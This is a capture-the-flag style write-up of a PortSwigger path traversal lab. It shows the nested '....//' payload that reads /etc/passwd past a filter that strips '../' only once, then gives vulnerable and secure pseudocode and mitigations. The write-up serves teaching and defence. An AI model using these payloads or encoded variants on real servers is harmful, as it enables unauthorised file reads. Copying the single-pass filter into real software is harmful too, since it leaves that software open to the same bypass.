# Lab 03: File Path Traversal, Traversal Sequences Stripped Non-Recursively

> **Topic**: Path Traversal
> **Lab Number**: 03
> **Platform**: PortSwigger Web Security Academy

## Category
Path Traversal — Non-Recursive Strip Bypass (Nested `....//` Sequences)

## Vulnerability Summary
The application serves product images via `GET /image?filename=<value>` and attempts to block path traversal by stripping `../` from the input. However, the stripping is performed only once (non-recursively). By nesting the traversal sequence so that removing `../` from the middle of `....//` leaves behind a new `../`, the filter is bypassed. The payload `....//....//....//etc/passwd` becomes `../../../etc/passwd` after one pass of stripping, which the server then resolves to `/etc/passwd` and returns its contents.

## Attack Methodology

### Step 1: Identify the Image Endpoint
```http
GET /image?filename=45.jpg HTTP/2
Host: 0a2a0085048312ee80e5a332004700a8.web-security-academy.net
Cookie: session=DmypJ2cHYzy9IU9uzrygvFIMKNsWI1lB
```

### Step 2: Understand the Filter Behaviour
A basic `../../../etc/passwd` payload is blocked — the filter strips `../` sequences. Testing reveals the strip is non-recursive: it makes a single pass over the string and removes each `../` it finds, then passes the result to the filesystem.

### Step 3: Craft the Nested Bypass Payload
The trick is to embed `../` inside a longer sequence such that after the filter removes the inner `../`, the outer characters collapse into a new `../`:

```
....//  →  strip ../  →  ../
```

Breaking it down character by character:
```
. . . . / /
    ^^
    └─ filter strips this ../
Result: . . / /  →  ../
```

Three levels of traversal:
```
....//....//....//etc/passwd
→ (strip ../ once) →
../../../etc/passwd
→ (filesystem resolves) →
/etc/passwd
```

### Step 4: Send the Payload

```http
GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: 0a2a0085048312ee80e5a332004700a8.web-security-academy.net
Cookie: session=DmypJ2cHYzy9IU9uzrygvFIMKNsWI1lB
```

### Step 5: Server Returns `/etc/passwd`

```http
HTTP/2 200 OK
Content-Type: image/jpeg
X-Frame-Options: SAMEORIGIN
Content-Length: 2316

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
...
```

200 OK with full `/etc/passwd` contents. Lab solved.

![Nested traversal payload ....//....//....//etc/passwd in Repeater — 200 response with /etc/passwd contents, lab solved](./screenshot.png)

## Technical Root Cause

### Vulnerable Code (Pseudocode)
```python
import os

IMAGE_DIR = '/var/www/images'

def serve_image(request):
    filename = request.GET.get('filename', '')
    # Non-recursive strip — only one pass
    filename = filename.replace('../', '')
    path = os.path.join(IMAGE_DIR, filename)
    with open(path, 'rb') as f:
        return HttpResponse(f.read(), content_type='image/jpeg')
```

`'....//....//....//etc/passwd'.replace('../', '')` executes a single left-to-right pass:
- Finds `../` at position 2 in `....//` → removes it → leaves `../` (the outer dots and slash collapse)
- Repeats for each `....//` group
- Result: `../../../etc/passwd`

The filter removed `../` but created new ones in the process.

### Why Single-Pass Stripping Always Fails

```
Input:    ....//
Pass 1:   ../ removed → ../    ← new traversal sequence created
Pass 2:   ../ removed → (empty)
```

Any number of passes still fails if the attacker nests deeply enough:
```
......///  →  strip ../  →  ....//  →  strip ../  →  ../
```

The only way to win is to stop playing the string-manipulation game entirely.

### Secure Code
```python
import os

IMAGE_DIR = '/var/www/images'

def serve_image(request):
    filename = request.GET.get('filename', '')
    path = os.path.realpath(os.path.join(IMAGE_DIR, filename))
    if not path.startswith(IMAGE_DIR + os.sep):
        return HttpResponseForbidden('Access denied')
    with open(path, 'rb') as f:
        return HttpResponse(f.read(), content_type='image/jpeg')
```

`os.path.realpath` resolves the canonical path after all `..` sequences are processed by the OS — no string manipulation, no bypass possible.

## Impact
- **Filter Completely Bypassed**: Non-recursive stripping is trivially defeated with nested sequences
- **Arbitrary File Read**: Any file readable by the web server process is accessible
- **No Authentication Required**: The endpoint is publicly accessible

**Severity: High**

## Proof of Concept

```
GET /image?filename=....//....//....//etc/passwd HTTP/2
Host: <lab-id>.web-security-academy.net
```

Response: `HTTP/2 200 OK` with full `/etc/passwd` contents.

## Key Takeaways
1. **Non-Recursive Stripping Is Trivially Bypassed**: Removing `../` once (or even multiple times) from a string is not a security control. Nested sequences like `....//` are specifically designed to survive one round of stripping. The attacker can always nest one level deeper than the filter strips.
2. **String Manipulation on Paths Is the Wrong Approach**: There are too many equivalent representations of a path traversal (`../`, `....//`, `%2e%2e/`, `%252e%252e/`, `..%2f`, etc.). Trying to block them all via string matching is a losing game. Resolve the canonical path and check the boundary instead.
3. **`os.path.realpath` + `startswith` Is the Correct Fix**: This approach is immune to all string-level bypasses because it lets the OS resolve the path before any check is made. The OS doesn't care about `....//` — it resolves it the same as `../`.
4. **Allowlisting Is Even Stronger**: A regex that only permits `[a-zA-Z0-9_\-]+\.(jpg|png|...)` rejects all traversal variants before any path construction occurs.

## Mitigation

### 1. Canonical Path + Boundary Check (Primary)
```python
path = os.path.realpath(os.path.join(IMAGE_DIR, filename))
if not path.startswith(IMAGE_DIR + os.sep):
    abort(403)
```

### 2. Allowlist Filename Format
```python
import re
if not re.fullmatch(r'[a-zA-Z0-9_\-]+\.(jpg|jpeg|png|gif|webp)', filename):
    abort(400)
```

### 3. Never Strip — Reject
If traversal characters are detected, reject the request outright rather than attempting to sanitize. Sanitization logic is always bypassable; rejection is not.

## References
- [PortSwigger — File Path Traversal, Traversal Sequences Stripped Non-Recursively](https://portswigger.net/web-security/file-path-traversal/lab-sequences-stripped-non-recursively)
- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP — Path Traversal](https://owasp.org/www-community/attacks/Path_Traversal)
- [CWE-22: Improper Limitation of a Pathname to a Restricted Directory](https://cwe.mitre.org/data/definitions/22.html)

## Tools Used
- Burp Suite Professional (Proxy, Repeater)
- Chromium

---

*Lab completed on: 2026-05-08*  
*Writeup by vibhxr*
